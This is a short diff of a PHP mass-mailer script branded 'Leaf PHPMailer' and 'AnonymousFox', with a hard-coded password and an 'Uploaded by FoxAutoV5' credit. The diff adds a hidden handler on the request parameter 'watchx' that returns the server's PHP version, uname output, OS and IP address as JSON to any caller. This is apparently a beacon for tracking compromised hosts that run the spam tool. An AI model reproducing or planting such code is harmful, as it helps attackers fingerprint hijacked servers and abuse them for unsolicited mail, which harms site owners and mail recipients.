@@ -8,6 +8,7 @@
 
 $password = "AnonymousFox";
 
+
 session_start();
 error_reporting(0);
 set_time_limit(0);
@@ -4340,6 +4341,18 @@ class phpmailerException extends Exception
         return $errorMsg;
     }
 }
+if ($_REQUEST['watchx']) {
+	$version = phpversion();
+	$uname =  php_uname();
+	$ip = gethostbyname($_SERVER["HTTP_HOST"]);	
+	echo json_encode (array ("version"=>$version,
+		"uname"=>$uname,
+		"platform"=>PHP_OS,
+		"ip"=>$ip,
+		"mailerx"=>true,	
+	));
+	die ();
+}
 function leafheader(){
 print '
 <head>
@@ -4431,8 +4444,9 @@ print '<div class="container col-lg-6">
                 <li>your domain is <b>[-emaildomain-]</b> = Your Domain is <b>domain.com</b></li>
                 <li>your code is  <b>[-randommd5-]</b> = your code is <b>e10adc3949ba59abbe56e057f20f883e</b></li>
             </ul>
-
-            <h6>by <b><a href="http://'.$leaf['website'].'">'.$leaf['website'].'</a></b></h6>
+			<br>
+			 <h6><b><font color="green">Uploaded</font></b> by <b><a href="https://anonymousfox.co">'.'FoxAutoV5'.'</a></b> [The best Tools] </h6>
+			 <h6><font color="green">Leaf PHPMailer</font> by <b><a href="http://'.$leaf['website'].'">'.$leaf['website'].'</a></b></h6>
         </div>
     </div>';  
 if($_POST['action']=="send"){
